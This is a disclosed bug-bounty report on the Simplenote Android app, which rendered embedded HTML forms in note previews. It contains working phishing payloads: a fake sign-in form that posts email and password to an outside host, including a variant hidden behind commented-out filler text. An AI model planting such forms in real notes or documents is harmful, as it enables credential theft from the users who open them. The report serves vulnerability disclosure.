# Improper markup sanitisation in Simplenote Android application.

## Report Details
- **Report ID**: 297547
- **URL**: https://hackerone.com/reports/297547
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-12-13T16:37:48.424Z
- **Disclosed**: 2018-02-13T19:23:58.321Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
# Description

The Simplenote Android application (1.5.6) still allows users to embed fully-fledged forms.

```html
Sign in to Simplenote
<h1 class="signin">Please sign in</h1>
<br>
<form action="https://example.com/login.php" id="login" name="login">
   <fieldset class="classic-fieldset" style="border:none;">
      <div class="input-fields">
         <p style="margin-right: 10px;"><label for="email">Email</label><input id="email" name="email" placeholder="Email" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="email"></p>
         <div id="warn"></div>
         <p style="margin-right: 10px;"><label for="password">Password</label><input id="password" name="password" placeholder="Password" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="password"></p>
      </div>
      <br>
      <p><input class="submit button" type="submit" value="Sign In"></p>
      <p><input checked="checked" id="check" name="remember" type="checkbox" value="1"> <label class="option" for="remember">Remember Me</label></p>
      <p class="forgot"><a href="#">Forgot your password?</a></p>
   </fieldset>
</form>
```

{F246484}

A more convincing proof of concept could consist of hiding the form inside several paragraphs of text which are located in HTML comments. That way the victim is presented with what appears to be a text document in the editor panel and then the paragraphs disappear in the preview window.

```html
Sign in to Simplenote

<!-- Lorem ipsum dolor amet polaroid kogi cloud bread keffiyeh vegan DIY pour-over kombucha helvetica wayfarers. Vinyl retro meh cloud bread dreamcatcher af. Dreamcatcher squid twee, tumeric put a bird on it raclette direct trade. Crucifix leggings gluten-free retro la croix. Selvage beard subway tile hella roof party, everyday carry iceland waistcoat kombucha pug. Meh blog cred poke kogi XOXO PBR&B man bun vexillologist woke craft beer chicharrones keffiyeh.

Everyday carry butcher banh mi YOLO whatever shabby chic wayfarers fingerstache hashtag sartorial cloud bread dreamcatcher farm-to-table fashion axe. Post-ironic sartorial farm-to-table venmo next level franzen narwhal crucifix man braid quinoa. Before they sold out jean shorts squid, chicharrones woke scenester normcore church-key. Roof party skateboard lomo neutra disrupt freegan pop-up flannel post-ironic, semiotics art party glossier tilde. Ramps iPhone skateboard, selvage keffiyeh hammock organic fam literally +1 tote bag. Artisan humblebrag scenester retro, umami meggings gochujang cloud bread bespoke. Edison bulb cred pabst iPhone, vice chambray church-key.

Chambray affogato air plant direct trade wolf hot chicken selvage lo-fi franzen next level. Pinterest viral sriracha hell of celiac. Lo-fi knausgaard heirloom aesthetic street art, unicorn prism normcore distillery leggings vice kinfolk neutra twee lyft. Hexagon lo-fi mlkshk, hella wolf health goth viral pinterest.

Asymmetrical shabby chic normcore slow-carb banjo pug hashtag green juice la croix flannel. Four dollar toast 8-bit woke tumblr, YOLO hammock tattooed wolf health goth intelligentsia affogato freegan skateboard mustache. Adaptogen scenester portland health goth austin farm-to-table vexillologist normcore synth twee raw denim microdosing. XOXO paleo swag stumptown adaptogen kinfolk raclette authentic.

Shabby chic enamel pin vape, trust fund poutine brunch af jianbing. 8-bit four dollar toast quinoa fixie, lomo farm-to-table woke waistcoat selvage normcore palo santo vegan. Chambray chicharrones swag, kombucha celiac dreamcatcher venmo. Tousled leggings selvage unicorn. Hoodie whatever glossier, mixtape keytar kickstarter vaporware forage pug chicharrones slow-carb. Bushwick keffiyeh 90's vexillologist readymade yr, try-hard pabst prism messenger bag disrupt street art succulents fanny pack 8-bit. -->

<h1 class="signin">Please sign in</h1>
<br>
<form action="https://example.com/login.php" id="login" name="login">
   <fieldset class="classic-fieldset" style="border:none;">
      <div class="input-fields">
         <p style="margin-right: 10px;"><label for="email">Email</label><input id="email" name="email" placeholder="Email" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="email"></p>
         <div id="warn"></div>
         <p style="margin-right: 10px;"><label for="password">Password</label><input id="password" name="password" placeholder="Password" required="" style="padding: 0.3em;font-size: 14px;font-size: 21px;font-weight: 300;max-width: 35em;height: 44px;border: px solid #f0f0f0;background: #fcfcfc;width: 350px;margin-left:20px;" type="password"></p>
      </div>
      <br>
      <p><input class="submit button" type="submit" value="Sign In"></p>
      <p><input checked="checked" id="check" name="remember" type="checkbox" value="1"> <label class="option" for="remember">Remember Me</label></p>
      <p class="forgot"><a href="#">Forgot your password?</a></p>
   </fieldset>
</form>
```

The form HTML could be replaced with a little bit of JavaScript that dynamically generates the form. This would further increase the likelihood of this attack succeeding.

## Impact

Any user input is sent to an attacker's server when submitted via the form.

## Attachments
- screenshot_20171213-172400_1024.jpg
